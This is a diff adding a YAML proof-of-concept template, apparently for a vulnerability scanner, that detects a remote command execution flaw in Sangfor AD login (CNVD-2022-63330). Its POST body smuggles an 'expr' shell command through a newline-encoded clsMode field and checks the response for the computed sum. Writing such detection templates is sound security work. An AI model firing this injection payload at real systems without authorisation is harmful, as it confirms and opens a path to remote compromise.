@@ -1,0 +1,19 @@
+name: poc-yaml-sangfor-ad-rce
+manual: true
+transport: http
+set:
+    s1: randomInt(100000, 200000)
+    s2: randomInt(10000, 20000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /rep/login
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: clsMode=cls_mode_login%0Aexpr+{{s1}}+%2B+{{s2}}%0A&index=index&log_type=report&loginType=account&page=login&rnd=0.5122400487619505&userID=admin&userPsw=fjiimx31"
+        expression: response.status == 200 && response.body_string.contains(string(s1 + s2))
+expression: r0()
+detail:
+    author: CNVD-2022-63330
